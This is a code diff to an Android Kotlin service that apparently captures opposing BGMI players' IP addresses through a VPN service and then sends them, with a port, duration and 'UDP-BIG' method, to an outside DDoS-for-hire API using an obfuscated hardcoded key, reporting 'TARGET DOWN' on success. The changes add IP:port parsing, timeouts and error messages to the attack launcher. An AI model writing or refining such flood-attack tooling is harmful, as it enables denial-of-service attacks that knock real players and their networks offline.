@@ -121,7 +121,6 @@ class FloatingService : Service() {
             tvLog.text = "> SNIFFING BGMI..."
             btnGetIp.text = "SNIFFING..."
             btnGetIp.isEnabled = false
-            // Direct VPN start
             startService(Intent(this, VpnService::class.java))
         }
 
@@ -240,30 +239,54 @@ class FloatingService : Service() {
 
     private fun executeAttack(ip: String, port: String, time: Int) {
         Thread {
+            var conn: HttpURLConnection? = null
             try {
                 val apiUrl = "https://specterapi.duckdns.org/api/v1/execute"
                 val encryptedKey = "dDNad1gyeHBkbVZmTURZMVlUTXhPREEzT0dZelpXWmpNVGxsTUdKbE56SXdNVEF5WlRsaE4yVT0="
                 val apiKey = decryptData(encryptedKey)
 
+                var finalIp = ip
+                var finalPort = port
+                if (ip.contains(":")) {
+                    val parts = ip.split(":")
+                    finalIp = parts[0]
+                    finalPort = parts[1]
+                }
+
                 val url = URL(apiUrl)
-                val conn = url.openConnection() as HttpURLConnection
+                conn = url.openConnection() as HttpURLConnection
                 conn.requestMethod = "POST"
                 conn.setRequestProperty("Content-Type", "application/json")
                 conn.setRequestProperty("x-api-key", apiKey)
                 conn.doOutput = true
+                conn.connectTimeout = 8000
+                conn.readTimeout = 8000
 
-                val jsonInput = """{"target":"$ip","port":$port,"duration":$time,"method":"UDP-BIG"}"""
+                val jsonInput = """{"target":"$finalIp","port":$finalPort,"duration":$time,"method":"UDP-BIG"}"""
                 conn.outputStream.use { os -> os.write(jsonInput.toByteArray()) }
 
+                val responseCode = conn.responseCode
+                var responseMsg = conn.responseMessage
+                
+                if (responseCode != 200 && responseCode != 201) {
+                    try {
+                        val errorBody = conn.errorStream?.bufferedReader()?.readText()
+                        if (!errorBody.isNullOrEmpty()) {
+                            responseMsg = errorBody.take(40)
+                        }
+                    } catch (e: Exception) {}
+                }
+
                 Handler(Looper.getMainLooper()).post {
-                    if (conn.responseCode in 200..201) {
+                    if (responseCode in 200..201) {
                         btnAttack.text = "LAUNCHED ✅"
                         btnAttack.setBackgroundColor(android.graphics.Color.parseColor("#22C55E"))
                         tvLog.text = "> SUCCESS! TARGET DOWN"
                     } else {
                         btnAttack.text = "LAUNCH 🚀"
                         btnAttack.isEnabled = true
-                        tvLog.text = "> ERROR: ${conn.responseCode}"
+                        tvLog.text = "> FAIL: $responseCode $responseMsg"
+                        Toast.makeText(this@FloatingService, "Error: $responseMsg", Toast.LENGTH_LONG).show()
                     }
                 }
             } catch (e: Exception) {
@@ -271,7 +294,10 @@ class FloatingService : Service() {
                     btnAttack.text = "LAUNCH 🚀"
                     btnAttack.isEnabled = true
                     tvLog.text = "> NETWORK FAIL"
+                    Toast.makeText(this@FloatingService, "Net Err: ${e.message?.take(20)}", Toast.LENGTH_LONG).show()
                 }
+            } finally {
+                conn?.disconnect()
             }
         }.start()
     }
